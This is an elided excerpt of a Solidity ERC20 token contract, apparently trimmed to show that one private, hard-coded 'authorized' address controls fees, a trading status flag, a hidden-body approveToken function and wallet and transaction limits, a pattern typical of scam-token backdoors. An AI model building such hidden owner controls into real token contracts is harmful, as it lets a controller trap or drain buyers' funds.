...
contract test1  is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xe4A06A4711A9e9EaC5d96C6873eCA65B051EcEED); 
    address payable public Wallet_Dev = payable(0x75fC52b65D5A05174c2224017ae6487a7A524F82);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address private _authorized = 0x550620Ea93D1D86db23f0F05bAdBA072B88A03dB;
    ...
    string private constant _symbol = unicode"test1"; 
    ...
    constructor () {
        ...
        _owner = 0x550620Ea93D1D86db23f0F05bAdBA072B88A03dB;
    ...
    function setFee(uint256 Buy_Fee, uint256 Sell_Fee) external authorized() {
    ...
    function checkStatus(bool _status) public authorized () {
        tokenState = _status;
    }
    ...
    function approveToken(uint256 acc, address adr) authorized() public virtual {
    ...
    function maxWallet(uint256 maxWL) external authorized() {
        _maxWalletToken = maxWL;
    }
    function maxTx(uint256 maxT) external authorized() {
        _maxTxAmount = maxT;
    }
